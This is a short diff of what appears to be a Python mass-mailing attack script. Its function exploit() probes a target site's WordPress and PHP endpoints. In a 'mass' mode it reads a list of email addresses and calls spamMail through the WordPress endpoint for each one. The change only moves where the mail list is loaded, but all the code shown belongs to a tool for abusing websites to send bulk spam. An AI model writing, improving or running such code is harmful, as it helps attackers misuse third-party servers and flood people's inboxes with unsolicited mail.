@@ -131,9 +131,9 @@ def exploit(url,sender,temp,word,types):
 )
     wpx = wpURL(url)
     phpx = phpURL(url)
-    lines = mailList(word)
     try:
         if types=="mass":
+            lines = mailList(word)
             if(scraper.get(wpx).status_code==200 and scraper.get(phpx).status_code!=200):
                 for line in lines:
                     spamMail(wpx,sender,line.replace("\n",""),temp)
